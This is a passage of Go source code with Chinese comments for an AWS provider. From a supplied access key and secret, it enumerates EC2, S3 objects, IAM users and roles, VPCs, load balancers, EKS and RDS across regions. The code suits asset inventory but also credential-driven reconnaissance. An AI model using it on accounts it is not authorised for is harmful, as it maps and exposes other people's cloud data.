package aws

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/config"
	"github.com/aws/aws-sdk-go-v2/service/ec2"
	"github.com/aws/aws-sdk-go-v2/service/ec2/types"
	"github.com/aws/aws-sdk-go-v2/service/eks"
	"github.com/aws/aws-sdk-go-v2/service/elasticloadbalancingv2"
	"github.com/aws/aws-sdk-go-v2/service/iam"
	"github.com/aws/aws-sdk-go-v2/service/kms"
	"github.com/aws/aws-sdk-go-v2/service/rds"
	"github.com/aws/aws-sdk-go-v2/service/s3"
	"github.com/aws/aws-sdk-go-v2/service/ssm"
	sts "github.com/aws/aws-sdk-go-v2/service/sts"
	stsTypes "github.com/aws/aws-sdk-go-v2/service/sts/types"
)

// AWSProvider AWS云平台实现
type AWSProvider struct {
	accessKey   string
	secretKey   string
	region      string
	ec2Client   *ec2.Client
	iamClient   *iam.Client
	s3Client    *s3.Client
	elbv2Client *elasticloadbalancingv2.Client
	eksClient   *eks.Client
	kmsClient   *kms.Client
	rdsClient   *rds.Client
	ssmClient   *ssm.Client
}

// NewAWSProvider 创建AWS云平台实例
func NewAWSProvider(accessKey, secretKey, region string) (*AWSProvider, error) {
	// 保存原始region值，用于判断是否需要遍历所有区域
	originalRegion := region

	// 如果区域为空，使用默认区域进行初始化
	initRegion := region
	if initRegion == "" {
		initRegion = "us-east-1"
	}

	provider := &AWSProvider{
		accessKey: accessKey,
		secretKey: secretKey,
		region:    originalRegion, // 保存原始region值
	}

	// 初始化客户端
	err := provider.Init(accessKey, secretKey, initRegion)
	if err != nil {
		return nil, err
	}

	return provider, nil
}

// Init 初始化AWS客户端
func (p *AWSProvider) Init(accessKey, secretKey, region string) error {
	// 加载配置
	cfg, err := config.LoadDefaultConfig(context.Background(),
		config.WithRegion(region),
		config.WithCredentialsProvider(&StaticCredentialsProvider{
			Value:  accessKey,
			Secret: secretKey,
		}),
	)
	if err != nil {
		return fmt.Errorf("failed to load AWS config: %w", err)
	}

	// 创建客户端
	p.ec2Client = ec2.NewFromConfig(cfg)
	p.iamClient = iam.NewFromConfig(cfg)
	p.s3Client = s3.NewFromConfig(cfg)
	p.elbv2Client = elasticloadbalancingv2.NewFromConfig(cfg)
	p.eksClient = eks.NewFromConfig(cfg)
	p.kmsClient = kms.NewFromConfig(cfg)
	p.rdsClient = rds.NewFromConfig(cfg)
	p.ssmClient = ssm.NewFromConfig(cfg)

	return nil
}

// StaticCredentialsProvider 静态凭证提供者
type StaticCredentialsProvider struct {
	Value  string
	Secret string
}

// Retrieve 检索凭证
func (p *StaticCredentialsProvider) Retrieve(ctx context.Context) (aws.Credentials, error) {
	return aws.Credentials{
		AccessKeyID:     p.Value,
		SecretAccessKey: p.Secret,
	}, nil
}

// EnumerateResources 枚举AWS资源
func (p *AWSProvider) EnumerateResources(resourceType string) (map[string]interface{}, error) {
	result := make(map[string]interface{})
	errors := []string{}

	// 定义所有可能的AWS区域
	awsRegions := []string{
		"us-east-1",
		"us-east-2",
		"us-west-1",
		"us-west-2",
		"eu-west-1",
		"eu-central-1",
		"ap-southeast-1",
		"ap-southeast-2",
		"ap-northeast-1",
		"ap-northeast-2",
		"ap-south-1",
		"ca-central-1",
		"sa-east-1",
	}

	// 确定要使用的区域
	regions := []string{}
	if p.region != "" {
		// 如果指定了区域，只使用该区域
		regions = []string{p.region}
	} else {
		// 否则遍历所有区域
		regions = awsRegions
	}

	switch resourceType {
	case "ec2":
		// 枚举EC2实例
		var allInstances []interface{}
		for _, region := range regions {
			// 创建该区域的客户端
			regionProvider, err := NewAWSProvider(p.accessKey, p.secretKey, region)
			if err != nil {
				errorMsg := fmt.Sprintf("EC2 (%s): %v", region, err)
				errors = append(errors, errorMsg)
				fmt.Printf("Warning: Failed to create EC2 client for region %s: %v\n", region, err)
				continue
			}

			// 枚举该区域的EC2实例
			instances, err := regionProvider.enumerateEC2Instances()
			if err != nil {
				errorMsg := fmt.Sprintf("EC2 (%s): %v", region, err)
				errors = append(errors, errorMsg)
				fmt.Printf("Warning: Failed to enumerate EC2 instances in region %s: %v\n", region, err)
				continue
			}

			// 将该区域的实例添加到总列表
			for _, instance := range instances {
				// 添加区域信息
				if instanceMap, ok := instance.(map[string]interface{}); ok {
					instanceMap["region"] = region
					allInstances = append(allInstances, instanceMap)
				}
			}
		}

		if len(allInstances) > 0 {
			result["instances"] = allInstances
		} else {
			result["instances"] = []interface{}{}
		}

	case "s3":
		// 枚举S3存储桶
		// S3存储桶是全局的，不需要按区域枚举
		buckets, err := p.enumerateS3Buckets()
		if err != nil {
			// 记录错误
			errorMsg := fmt.Sprintf("S3: %v", err)
			errors = append(errors, errorMsg)
			fmt.Printf("Warning: Failed to enumerate S3 buckets: %v\n", err)
			result["buckets"] = []interface{}{}
		} else {
			result["buckets"] = buckets
		}

	case "iam":
		// 枚举IAM用户和角色
		// IAM是全局的，不需要按区域枚举
		users, err := p.enumerateIAMUsers()
		if err != nil {
			// 记录错误
			errorMsg := fmt.Sprintf("IAM Users: %v", err)
			errors = append(errors, errorMsg)
			fmt.Printf("Warning: Failed to enumerate IAM users: %v\n", err)
			result["users"] = []interface{}{}
		} else {
			result["users"] = users
		}

		// 枚举IAM角色
		roles, err := p.enumerateIAMRoles()
		if err != nil {
			// 记录错误
			errorMsg := fmt.Sprintf("IAM Roles: %v", err)
			errors = append(errors, errorMsg)
			fmt.Printf("Warning: Failed to enumerate IAM roles: %v\n", err)
			result["roles"] = []interface{}{}
		} else {
			result["roles"] = roles
		}

	case "vpc":
		// 枚举VPC资源
		var allVPCs []interface{}
		for _, region := range regions {
			// 创建该区域的客户端
			regionProvider, err := NewAWSProvider(p.accessKey, p.secretKey, region)
			if err != nil {
				errorMsg := fmt.Sprintf("VPC (%s): %v", region, err)
				errors = append(errors, errorMsg)
				fmt.Printf("Warning: Failed to create VPC client for region %s: %v\n", region, err)
				continue
			}

			// 枚举该区域的VPC
			vpcs, err := regionProvider.enumerateVPCs()
			if err != nil {
				errorMsg := fmt.Sprintf("VPC (%s): %v", region, err)
				errors = append(errors, errorMsg)
				fmt.Printf("Warning: Failed to enumerate VPCs in region %s: %v\n", region, err)
				continue
			}

			// 将该区域的VPC添加到总列表
			for _, vpc := range vpcs {
				// 添加区域信息
				if vpcMap, ok := vpc.(map[string]interface{}); ok {
					vpcMap["region"] = region
					allVPCs = append(allVPCs, vpcMap)
				}
			}
		}

		if len(allVPCs) > 0 {
			result["vpcs"] = allVPCs
		} else {
			result["vpcs"] = []interface{}{}
		}

	case "route":
		// 枚举路由表资源
		var allRouteTables []interface{}
		for _, region := range regions {
			// 创建该区域的客户端
			regionProvider, err := NewAWSProvider(p.accessKey, p.secretKey, region)
			if err != nil {
				errorMsg := fmt.Sprintf("Route Tables (%s): %v", region, err)
				errors = append(errors, errorMsg)
				fmt.Printf("Warning: Failed to create Route Tables client for region %s: %v\n", region, err)
				continue
			}

			// 枚举该区域的路由表
			routeTables, err := regionProvider.enumerateRouteTables()
			if err != nil {
				errorMsg := fmt.Sprintf("Route Tables (%s): %v", region, err)
				errors = append(errors, errorMsg)
				fmt.Printf("Warning: Failed to enumerate Route Tables in region %s: %v\n", region, err)
				continue
			}

			// 将该区域的路由表添加到总列表
			for _, rt := range routeTables {
				// 添加区域信息
				if rtMap, ok := rt.(map[string]interface{}); ok {
					rtMap["region"] = region
					allRouteTables = append(allRouteTables, rtMap)
				}
			}
		}

		if len(allRouteTables) > 0 {
			result["routeTables"] = allRouteTables
		} else {
			result["routeTables"] = []interface{}{}
		}

	case "elb":
		// 枚举ELB资源
		var allELBs []interface{}
		for _, region := range regions {
			// 创建该区域的客户端
			regionProvider, err := NewAWSProvider(p.accessKey, p.secretKey, region)
			if err != nil {
				errorMsg := fmt.Sprintf("ELB (%s): %v", region, err)
				errors = append(errors, errorMsg)
				fmt.Printf("Warning: Failed to create ELB client for region %s: %v\n", region, err)
				continue
			}

			// 枚举该区域的ELB
			elbs, err := regionProvider.enumerateELBs()
			if err != nil {
				errorMsg := fmt.Sprintf("ELB (%s): %v", region, err)
				errors = append(errors, errorMsg)
				fmt.Printf("Warning: Failed to enumerate ELBs in region %s: %v\n", region, err)
				continue
			}

			// 将该区域的ELB添加到总列表
			for _, elb := range elbs {
				// 添加区域信息
				if elbMap, ok := elb.(map[string]interface{}); ok {
					elbMap["region"] = region
					allELBs = append(allELBs, elbMap)
				}
			}
		}

		if len(allELBs) > 0 {
			result["elbs"] = allELBs
		} else {
			result["elbs"] = []interface{}{}
		}

	case "eks":
		// 枚举EKS集群
		var allClusters []interface{}
		for _, region := range regions {
			// 创建该区域的客户端
			regionProvider, err := NewAWSProvider(p.accessKey, p.secretKey, region)
			if err != nil {
				errorMsg := fmt.Sprintf("EKS (%s): %v", region, err)
				errors = append(errors, errorMsg)
				fmt.Printf("Warning: Failed to create EKS client for region %s: %v\n", region, err)
				continue
			}

			// 枚举该区域的EKS集群
			clusters, err := regionProvider.enumerateEKSClusters()
			if err != nil {
				errorMsg := fmt.Sprintf("EKS (%s): %v", region, err)
				errors = append(errors, errorMsg)
				fmt.Printf("Warning: Failed to enumerate EKS clusters in region %s: %v\n", region, err)
				continue
			}

			// 将该区域的EKS集群添加到总列表
			for _, cluster := range clusters {
				// 添加区域信息
				if clusterMap, ok := cluster.(map[string]interface{}); ok {
					clusterMap["region"] = region
					allClusters = append(allClusters, clusterMap)
				}
			}
		}

		if len(allClusters) > 0 {
			result["eksClusters"] = allClusters
		} else {
			result["eksClusters"] = []interface{}{}
		}

	case "kms":
		// 枚举KMS密钥
		var allKeys []interface{}
		for _, region := range regions {
			// 创建该区域的客户端
			regionProvider, err := NewAWSProvider(p.accessKey, p.secretKey, region)
			if err != nil {
				errorMsg := fmt.Sprintf("KMS (%s): %v", region, err)
				errors = append(errors, errorMsg)
				fmt.Printf("Warning: Failed to create KMS client for region %s: %v\n", region, err)
				continue
			}

			// 枚举该区域的KMS密钥
			keys, err := regionProvider.enumerateKMSKeys()
			if err != nil {
				errorMsg := fmt.Sprintf("KMS (%s): %v", region, err)
				errors = append(errors, errorMsg)
				fmt.Printf("Warning: Failed to enumerate KMS keys in region %s: %v\n", region, err)
				continue
			}

			// 将该区域的KMS密钥添加到总列表
			for _, key := range keys {
				// 添加区域信息
				if keyMap, ok := key.(map[string]interface{}); ok {
					keyMap["region"] = region
					allKeys = append(allKeys, keyMap)
				}
			}
		}

		if len(allKeys) > 0 {
			result["kmsKeys"] = allKeys
		} else {
			result["kmsKeys"] = []interface{}{}
		}

	case "rds":
		// 枚举RDS数据库实例
		var allInstances []interface{}
		for _, region := range regions {
			// 创建该区域的客户端
			regionProvider, err := NewAWSProvider(p.accessKey, p.secretKey, region)
			if err != nil {
				errorMsg := fmt.Sprintf("RDS (%s): %v", region, err)
				errors = append(errors, errorMsg)
				fmt.Printf("Warning: Failed to create RDS client for region %s: %v\n", region, err)
				continue
			}

			// 枚举该区域的RDS实例
			instances, err := regionProvider.enumerateRDSInstances()
			if err != nil {
				errorMsg := fmt.Sprintf("RDS (%s): %v", region, err)
				errors = append(errors, errorMsg)
				fmt.Printf("Warning: Failed to enumerate RDS instances in region %s: %v\n", region, err)
				continue
			}

			// 将该区域的RDS实例添加到总列表
			for _, instance := range instances {
				// 添加区域信息
				if instanceMap, ok := instance.(map[string]interface{}); ok {
					instanceMap["region"] = region
					allInstances = append(allInstances, instanceMap)
				}
			}
		}

		if len(allInstances) > 0 {
			result["rdsInstances"] = allInstances
		} else {
			result["rdsInstances"] = []interface{}{}
		}

	case "all":
		// 枚举所有资源

		// 尝试枚举EC2实例
		var allInstances []interface{}
		for _, region := range regions {
			// 创建该区域的客户端
			regionProvider, err := NewAWSProvider(p.accessKey, p.secretKey, region)
			if err != nil {
				errorMsg := fmt.Sprintf("EC2 (%s): %v", region, err)
				errors = append(errors, errorMsg)
				fmt.Printf("Warning: Failed to create EC2 client for region %s: %v\n", region, err)
				continue
			}

			// 枚举该区域的EC2实例
			instances, err := regionProvider.enumerateEC2Instances()
			if err != nil {
				errorMsg := fmt.Sprintf("EC2 (%s): %v", region, err)
				errors = append(errors, errorMsg)
				fmt.Printf("Warning: Failed to enumerate EC2 instances in region %s: %v\n", region, err)
				continue
			}

			// 将该区域的实例添加到总列表
			for _, instance := range instances {
				// 添加区域信息
				if instanceMap, ok := instance.(map[string]interface{}); ok {
					instanceMap["region"] = region
					allInstances = append(allInstances, instanceMap)
				}
			}
		}

		if len(allInstances) > 0 {
			result["instances"] = allInstances
		} else {
			result["instances"] = []interface{}{}
		}

		// 尝试枚举S3存储桶
		if buckets, err := p.enumerateS3Buckets(); err == nil {
			result["buckets"] = buckets
		} else {
			// 记录错误
			errorMsg := fmt.Sprintf("S3: %v", err)
			errors = append(errors, errorMsg)
			fmt.Printf("Warning: Failed to enumerate S3 buckets: %v\n", err)
			result["buckets"] = []interface{}{}
		}

		// 尝试枚举IAM用户
		if users, err := p.enumerateIAMUsers(); err == nil {
			result["users"] = users
		} else {
			// 记录错误
			errorMsg := fmt.Sprintf("IAM Users: %v", err)
			errors = append(errors, errorMsg)
			fmt.Printf("Warning: Failed to enumerate IAM users: %v\n", err)
			result["users"] = []interface{}{}
		}

		// 尝试枚举IAM角色
		if roles, err := p.enumerateIAMRoles(); err == nil {
			result["roles"] = roles
		} else {
			// 记录错误
			errorMsg := fmt.Sprintf("IAM Roles: %v", err)
			errors = append(errors, errorMsg)
			fmt.Printf("Warning: Failed to enumerate IAM roles: %v\n", err)
			result["roles"] = []interface{}{}
		}

		// 尝试枚举VPC资源
		var allVPCs []interface{}
		for _, region := range regions {
			// 创建该区域的客户端
			regionProvider, err := NewAWSProvider(p.accessKey, p.secretKey, region)
			if err != nil {
				errorMsg := fmt.Sprintf("VPC (%s): %v", region, err)
				errors = append(errors, errorMsg)
				fmt.Printf("Warning: Failed to create VPC client for region %s: %v\n", region, err)
				continue
			}

			// 枚举该区域的VPC
			vpcs, err := regionProvider.enumerateVPCs()
			if err != nil {
				errorMsg := fmt.Sprintf("VPC (%s): %v", region, err)
				errors = append(errors, errorMsg)
				fmt.Printf("Warning: Failed to enumerate VPCs in region %s: %v\n", region, err)
				continue
			}

			// 将该区域的VPC添加到总列表
			for _, vpc := range vpcs {
				// 添加区域信息
				if vpcMap, ok := vpc.(map[string]interface{}); ok {
					vpcMap["region"] = region
					allVPCs = append(allVPCs, vpcMap)
				}
			}
		}

		if len(allVPCs) > 0 {
			result["vpcs"] = allVPCs
		} else {
			result["vpcs"] = []interface{}{}
		}

		// 尝试枚举路由表资源
		var allRouteTables []interface{}
		for _, region := range regions {
			// 创建该区域的客户端
			regionProvider, err := NewAWSProvider(p.accessKey, p.secretKey, region)
			if err != nil {
				errorMsg := fmt.Sprintf("Route Tables (%s): %v", region, err)
				errors = append(errors, errorMsg)
				fmt.Printf("Warning: Failed to create Route Tables client for region %s: %v\n", region, err)
				continue
			}

			// 枚举该区域的路由表
			routeTables, err := regionProvider.enumerateRouteTables()
			if err != nil {
				errorMsg := fmt.Sprintf("Route Tables (%s): %v", region, err)
				errors = append(errors, errorMsg)
				fmt.Printf("Warning: Failed to enumerate Route Tables in region %s: %v\n", region, err)
				continue
			}

			// 将该区域的路由表添加到总列表
			for _, rt := range routeTables {
				// 添加区域信息
				if rtMap, ok := rt.(map[string]interface{}); ok {
					rtMap["region"] = region
					allRouteTables = append(allRouteTables, rtMap)
				}
			}
		}

		if len(allRouteTables) > 0 {
			result["routeTables"] = allRouteTables
		} else {
			result["routeTables"] = []interface{}{}
		}

		// 尝试枚举ELB资源
		var allELBs []interface{}
		for _, region := range regions {
			// 创建该区域的客户端
			regionProvider, err := NewAWSProvider(p.accessKey, p.secretKey, region)
			if err != nil {
				errorMsg := fmt.Sprintf("ELB (%s): %v", region, err)
				errors = append(errors, errorMsg)
				fmt.Printf("Warning: Failed to create ELB client for region %s: %v\n", region, err)
				continue
			}

			// 枚举该区域的ELB
			elbs, err := regionProvider.enumerateELBs()
			if err != nil {
				errorMsg := fmt.Sprintf("ELB (%s): %v", region, err)
				errors = append(errors, errorMsg)
				fmt.Printf("Warning: Failed to enumerate ELBs in region %s: %v\n", region, err)
				continue
			}

			// 将该区域的ELB添加到总列表
			for _, elb := range elbs {
				// 添加区域信息
				if elbMap, ok := elb.(map[string]interface{}); ok {
					elbMap["region"] = region
					allELBs = append(allELBs, elbMap)
				}
			}
		}

		if len(allELBs) > 0 {
			result["elbs"] = allELBs
		} else {
			result["elbs"] = []interface{}{}
		}

		// 尝试枚举EKS集群
		var allClusters []interface{}
		for _, region := range regions {
			// 创建该区域的客户端
			regionProvider, err := NewAWSProvider(p.accessKey, p.secretKey, region)
			if err != nil {
				errorMsg := fmt.Sprintf("EKS (%s): %v", region, err)
				errors = append(errors, errorMsg)
				fmt.Printf("Warning: Failed to create EKS client for region %s: %v\n", region, err)
				continue
			}

			// 枚举该区域的EKS集群
			clusters, err := regionProvider.enumerateEKSClusters()
			if err != nil {
				errorMsg := fmt.Sprintf("EKS (%s): %v", region, err)
				errors = append(errors, errorMsg)
				fmt.Printf("Warning: Failed to enumerate EKS clusters in region %s: %v\n", region, err)
				continue
			}

			// 将该区域的EKS集群添加到总列表
			for _, cluster := range clusters {
				// 添加区域信息
				if clusterMap, ok := cluster.(map[string]interface{}); ok {
					clusterMap["region"] = region
					allClusters = append(allClusters, clusterMap)
				}
			}
		}

		if len(allClusters) > 0 {
			result["eksClusters"] = allClusters
		} else {
			result["eksClusters"] = []interface{}{}
		}

		// 尝试枚举KMS密钥
		var allKeys []interface{}
		for _, region := range regions {
			// 创建该区域的客户端
			regionProvider, err := NewAWSProvider(p.accessKey, p.secretKey, region)
			if err != nil {
				errorMsg := fmt.Sprintf("KMS (%s): %v", region, err)
				errors = append(errors, errorMsg)
				fmt.Printf("Warning: Failed to create KMS client for region %s: %v\n", region, err)
				continue
			}

			// 枚举该区域的KMS密钥
			keys, err := regionProvider.enumerateKMSKeys()
			if err != nil {
				errorMsg := fmt.Sprintf("KMS (%s): %v", region, err)
				errors = append(errors, errorMsg)
				fmt.Printf("Warning: Failed to enumerate KMS keys in region %s: %v\n", region, err)
				continue
			}

			// 将该区域的KMS密钥添加到总列表
			for _, key := range keys {
				// 添加区域信息
				if keyMap, ok := key.(map[string]interface{}); ok {
					keyMap["region"] = region
					allKeys = append(allKeys, keyMap)
				}
			}
		}

		if len(allKeys) > 0 {
			result["kmsKeys"] = allKeys
		} else {
			result["kmsKeys"] = []interface{}{}
		}

		// 尝试枚举RDS数据库实例
		var allRDSInstances []interface{}
		for _, region := range regions {
			// 创建该区域的客户端
			regionProvider, err := NewAWSProvider(p.accessKey, p.secretKey, region)
			if err != nil {
				errorMsg := fmt.Sprintf("RDS (%s): %v", region, err)
				errors = append(errors, errorMsg)
				fmt.Printf("Warning: Failed to create RDS client for region %s: %v\n", region, err)
				continue
			}

			// 枚举该区域的RDS实例
			instances, err := regionProvider.enumerateRDSInstances()
			if err != nil {
				errorMsg := fmt.Sprintf("RDS (%s): %v", region, err)
				errors = append(errors, errorMsg)
				fmt.Printf("Warning: Failed to enumerate RDS instances in region %s: %v\n", region, err)
				continue
			}

			// 将该区域的RDS实例添加到总列表
			for _, instance := range instances {
				// 添加区域信息
				if instanceMap, ok := instance.(map[string]interface{}); ok {
					instanceMap["region"] = region
					allRDSInstances = append(allRDSInstances, instanceMap)
				}
			}
		}

		if len(allRDSInstances) > 0 {
			result["rdsInstances"] = allRDSInstances
		} else {
			result["rdsInstances"] = []interface{}{}
		}

	default:
		return nil, fmt.Errorf("unsupported resource type: %s", resourceType)
	}

	// 检查是否所有资源都枚举失败
	if len(result) == 0 {
		return nil, fmt.Errorf("failed to enumerate any resources")
	}

	// 如果有错误，将错误信息添加到结果中
	if len(errors) > 0 {
		result["errors"] = errors
	}

	return result, nil
}

// enumerateEC2Instances 枚举EC2实例
func (p *AWSProvider) enumerateEC2Instances() ([]interface{}, error) {
	// 创建带有超时的上下文
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	// 调用AWS SDK获取EC2实例列表
	input := &ec2.DescribeInstancesInput{}
	response, err := p.ec2Client.DescribeInstances(ctx, input)
	if err != nil {
		return nil, fmt.Errorf("failed to describe EC2 instances: %w", err)
	}

	var instances []interface{}
	for _, reservation := range response.Reservations {
		for _, instance := range reservation.Instances {
			// 构建标签映射
			tags := make(map[string]string)
			for _, tag := range instance.Tags {
				tags[*tag.Key] = *tag.Value
			}

			// 提取公网IP
			var publicIp string
			if instance.PublicIpAddress != nil {
				publicIp = *instance.PublicIpAddress
			}

			// 提取私网IP
			var privateIp string
			if instance.PrivateIpAddress != nil {
				privateIp = *instance.PrivateIpAddress
			}

			instances = append(instances, map[string]interface{}{
				"instanceId":   *instance.InstanceId,
				"instanceType": string(instance.InstanceType),
				"state":        string(instance.State.Name),
				"publicIp":     publicIp,
				"privateIp":    privateIp,
				"tags":         tags,
			})
		}
	}

	return instances, nil
}

// enumerateS3Buckets 枚举S3存储桶
func (p *AWSProvider) enumerateS3Buckets() ([]interface{}, error) {
	// 创建带有超时的上下文
	ctx, cancel := context.WithTimeout(context.Background(), 1*time.Minute)
	defer cancel()

	// 调用AWS SDK获取S3存储桶列表
	input := &s3.ListBucketsInput{}
	response, err := p.s3Client.ListBuckets(ctx, input)
	if err != nil {
		return nil, fmt.Errorf("failed to list S3 buckets: %w", err)
	}

	var buckets []interface{}
	// 限制处理的存储桶数量，防止超时
	maxBuckets := 50
	processedBuckets := 0

	for _, bucket := range response.Buckets {
		if processedBuckets >= maxBuckets {
			break
		}

		// 首先获取存储桶的实际区域
		location, err := p.s3Client.GetBucketLocation(ctx, &s3.GetBucketLocationInput{
			Bucket: aws.String(*bucket.Name),
		})

		var bucketRegion string
		if err == nil {
			if location.LocationConstraint == "" {
				bucketRegion = "us-east-1"
			} else {
				bucketRegion = string(location.LocationConstraint)
			}
		} else {
			// 如果获取区域失败，使用默认区域
			bucketRegion = "us-east-1"
		}

		// 如果指定了区域，只处理该区域的存储桶
		if p.region != "" && bucketRegion != p.region {
			continue
		}

		// 创建存储桶对象
		bucketObj := map[string]interface{}{
			"bucketName":   *bucket.Name,
			"creationDate": bucket.CreationDate.Format("2006-01-02T15:04:05Z"),
			"region":       bucketRegion,
		}

		// 创建新的S3客户端，使用存储桶的实际区域
		cfg, err := config.LoadDefaultConfig(context.Background(),
			config.WithRegion(bucketRegion),
			config.WithCredentialsProvider(&StaticCredentialsProvider{
				Value:  p.accessKey,
				Secret: p.secretKey,
			}),
		)
		if err == nil {
			// 创建新的S3客户端
			s3Client := s3.NewFromConfig(cfg)

			// 尝试列出存储桶中的所有文件
			input := &s3.ListObjectsV2Input{
				Bucket: aws.String(*bucket.Name),
				Prefix: aws.String(""),
			}

			var objects []interface{}
			var continuationToken *string

			// 分页获取所有对象
			for {
				if continuationToken != nil {
					input.ContinuationToken = continuationToken
				}

				response, err := s3Client.ListObjectsV2(ctx, input)
				if err != nil {
					break
				}

				for _, obj := range response.Contents {
					objects = append(objects, map[string]interface{}{
						"key":          *obj.Key,
						"size":         obj.Size,
						"lastModified": obj.LastModified.Format("2006-01-02T15:04:05Z"),
						"eTag":         *obj.ETag,
					})
				}

				if response.IsTruncated == nil || !*response.IsTruncated {
					break
				}
				continuationToken = response.NextContinuationToken
			}

			if len(objects) > 0 {
				bucketObj["objects"] = objects
				bucketObj["moreObjects"] = false
			} else {
				bucketObj["objects"] = []interface{}{}
				bucketObj["moreObjects"] = false
			}
		} else {
			bucketObj["objects"] = []interface{}{}
			bucketObj["moreObjects"] = false
		}

		buckets = append(buckets, bucketObj)
		processedBuckets++
	}

	// 如果有更多存储桶，添加一个提示
	if len(response.Buckets) > maxBuckets {
		excess := len(response.Buckets) - maxBuckets
		buckets = append(buckets, map[string]interface{}{
			"bucketName":   fmt.Sprintf("... 还有 %d 个存储桶未显示", excess),
			"creationDate": "",
			"region":       "",
			"objects":      []interface{}{},
			"moreObjects":  false,
		})
	}

	return buckets, nil
}

// isNetworkError 检查是否是网络错误
func isNetworkError(err error) bool {
	// 检查错误信息是否包含网络相关的关键词
	errorStr := err.Error()
	return strings.Contains(errorStr, "dial tcp") ||
		strings.Contains(errorStr, "no such host") ||
		strings.Contains(errorStr, "connection refused") ||
		strings.Contains(errorStr, "network is unreachable") ||
		strings.Contains(errorStr, "timeout")
}

// enumerateIAMUsers 枚举IAM用户
func (p *AWSProvider) enumerateIAMUsers() ([]interface{}, error) {
	// 创建带有超时的上下文
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	// 调用AWS SDK获取IAM用户列表
	input := &iam.ListUsersInput{}
	response, err := p.iamClient.ListUsers(ctx, input)
	if err != nil {
		return nil, fmt.Errorf("failed to list IAM users: %w", err)
	}

	var users []interface{}
	for _, user := range response.Users {
		users = append(users, map[string]interface{}{
			"userName": *user.UserName,
			"userId":   *user.UserId,
			"arn":      *user.Arn,
		})
	}

	return users, nil
}

// enumerateIAMRoles 枚举IAM角色
func (p *AWSProvider) enumerateIAMRoles() ([]interface{}, error) {
	// 创建带有超时的上下文
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	// 调用AWS SDK获取IAM角色列表
	input := &iam.ListRolesInput{}
	response, err := p.iamClient.ListRoles(ctx, input)
	if err != nil {
		return nil, fmt.Errorf("failed to list IAM roles: %w", err)
	}

	var roles []interface{}
	for _, role := range response.Roles {
		roles = append(roles, map[string]interface{}{
			"roleName": *role.RoleName,
			"roleId":   *role.RoleId,
			"arn":      *role.Arn,
		})
	}

	return roles, nil
}

// enumerateVPCs 枚举VPC资源
func (p *AWSProvider) enumerateVPCs() ([]interface{}, error) {
	// 创建带有超时的上下文
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	// 调用AWS SDK获取VPC列表
	input := &ec2.DescribeVpcsInput{}
	response, err := p.ec2Client.DescribeVpcs(ctx, input)
	if err != nil {
		return nil, fmt.Errorf("failed to describe VPCs: %w", err)
	}

	var vpcs []interface{}
	for _, vpc := range response.Vpcs {
		// 构建标签映射
		tags := make(map[string]string)
		for _, tag := range vpc.Tags {
			tags[*tag.Key] = *tag.Value
		}

		vpcs = append(vpcs, map[string]interface{}{
			"vpcId":     *vpc.VpcId,
			"cidrBlock": *vpc.CidrBlock,
			"state":     string(vpc.State),
			"isDefault": *vpc.IsDefault,
			"tags":      tags,
			"ownerId":   *vpc.OwnerId,
		})
	}

	return vpcs, nil
}

// enumerateRouteTables 枚举路由表资源
func (p *AWSProvider) enumerateRouteTables() ([]interface{}, error) {
	// 创建带有超时的上下文
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	// 调用AWS SDK获取路由表列表
	input := &ec2.DescribeRouteTablesInput{}
	response, err := p.ec2Client.DescribeRouteTables(ctx, input)
	if err != nil {
		return nil, fmt.Errorf("failed to describe route tables: %w", err)
	}

	var routeTables []interface{}
	for _, rt := range response.RouteTables {
		// 构建标签映射
		tags := make(map[string]string)
		for _, tag := range rt.Tags {
			tags[*tag.Key] = *tag.Value
		}

		// 提取路由信息
		var routes []interface{}
		for _, route := range rt.Routes {
			routeInfo := map[string]interface{}{
				"destinationCidrBlock": route.DestinationCidrBlock,
				"gatewayId":            route.GatewayId,
				"state":                string(route.State),
			}
			routes = append(routes, routeInfo)
		}

		routeTables = append(routeTables, map[string]interface{}{
			"routeTableId": *rt.RouteTableId,
			"vpcId":        *rt.VpcId,
			"routes":       routes,
			"tags":         tags,
		})
	}

	return routeTables, nil
}

// enumerateELBs 枚举ELB资源
func (p *AWSProvider) enumerateELBs() ([]interface{}, error) {
	// 创建带有超时的上下文
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	// 调用AWS SDK获取ELB列表
	input := &elasticloadbalancingv2.DescribeLoadBalancersInput{}
	response, err := p.elbv2Client.DescribeLoadBalancers(ctx, input)
	if err != nil {
		return nil, fmt.Errorf("failed to describe load balancers: %w", err)
	}

	var elbs []interface{}
	for _, elb := range response.LoadBalancers {
		elbs = append(elbs, map[string]interface{}{
			"loadBalancerName":  *elb.LoadBalancerName,
			"loadBalancerArn":   *elb.LoadBalancerArn,
			"type":              string(elb.Type),
			"dnsName":           elb.DNSName,
			"state":             elb.State.Code,
			"availabilityZones": elb.AvailabilityZones,
			"securityGroups":    elb.SecurityGroups,
		})
	}

	return elbs, nil
}

// enumerateEKSClusters 枚举EKS集群
func (p *AWSProvider) enumerateEKSClusters() ([]interface{}, error) {
	// 创建带有超时的上下文
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	// 调用AWS SDK获取EKS集群列表
	input := &eks.ListClustersInput{}
	response, err := p.eksClient.ListClusters(ctx, input)
	if err != nil {
		return nil, fmt.Errorf("failed to list EKS clusters: %w", err)
	}

	var clusters []interface{}
	for _, clusterName := range response.Clusters {
		// 获取每个集群的详细信息
		describeInput := &eks.DescribeClusterInput{
			Name: aws.String(clusterName),
		}
		describeResponse, err := p.eksClient.DescribeCluster(ctx, describeInput)
		if err != nil {
			// 如果获取详细信息失败，继续处理下一个集群
			continue
		}

		cluster := describeResponse.Cluster
		clusters = append(clusters, map[string]interface{}{
			"name":               *cluster.Name,
			"arn":                *cluster.Arn,
			"version":            *cluster.Version,
			"status":             string(cluster.Status),
			"endpoint":           cluster.Endpoint,
			"roleArn":            cluster.RoleArn,
			"createdAt":          cluster.CreatedAt,
			"resourcesVpcConfig": cluster.ResourcesVpcConfig,
		})
	}

	return clusters, nil
}

// enumerateKMSKeys 枚举KMS密钥
